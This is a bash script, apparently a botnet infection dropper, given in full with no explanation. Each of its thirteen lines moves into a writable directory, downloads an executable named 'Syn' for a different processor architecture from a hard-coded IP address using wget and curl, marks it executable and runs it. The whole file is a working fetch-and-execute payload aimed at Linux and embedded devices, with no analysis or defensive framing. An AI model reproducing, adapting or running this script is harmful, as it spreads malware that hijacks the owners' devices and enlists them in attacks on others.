#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.x86; curl -O http://5.199.143.110/Syn/Syn.x86; cat Syn.x86 > Syn0; chmod +x *; ./Syn0 Syn.x86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.mips; curl -O http://5.199.143.110/Syn/Syn.mips; cat Syn.mips > Syn0; chmod +x *; ./Syn0 Syn.mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.mpsl; curl -O http://5.199.143.110/Syn/Syn.mpsl; cat Syn.mpsl > Syn0; chmod +x *; ./Syn0 Syn.mpsl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.arm; curl -O http://5.199.143.110/Syn/Syn.arm; cat Syn.arm > Syn0; chmod +x *; ./Syn0 Syn.arm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.arm5; curl -O http://5.199.143.110/Syn/Syn.arm5; cat Syn.arm5 > Syn0; chmod +x *; ./Syn0 Syn.arm5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.arm6; curl -O http://5.199.143.110/Syn/Syn.arm6; cat Syn.arm6 > Syn0; chmod +x *; ./Syn0 Syn.arm6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.arm7; curl -O http://5.199.143.110/Syn/Syn.arm7; cat Syn.arm7 > Syn0; chmod +x *; ./Syn0 Syn.arm7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.ppc; curl -O http://5.199.143.110/Syn/Syn.ppc; cat Syn.ppc > Syn0; chmod +x *; ./Syn0 Syn.ppc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.m68k; curl -O http://5.199.143.110/Syn/Syn.m68k; cat Syn.m68k > Syn0; chmod +x *; ./Syn0 Syn.m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.spc; curl -O http://5.199.143.110/Syn/Syn.spc; cat Syn.spc > Syn0; chmod +x *; ./Syn0 Syn.spc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.i686; curl -O http://5.199.143.110/Syn/Syn.i686; cat Syn.i686 > Syn0; chmod +x *; ./Syn0 Syn.i686
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.sh4; curl -O http://5.199.143.110/Syn/Syn.sh4; cat Syn.sh4 > Syn0; chmod +x *; ./Syn0 Syn.sh4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.199.143.110/Syn/Syn.arc; curl -O http://5.199.143.110/Syn/Syn.arc; cat Syn.arc > Syn0; chmod +x *; ./Syn0 Syn.arc
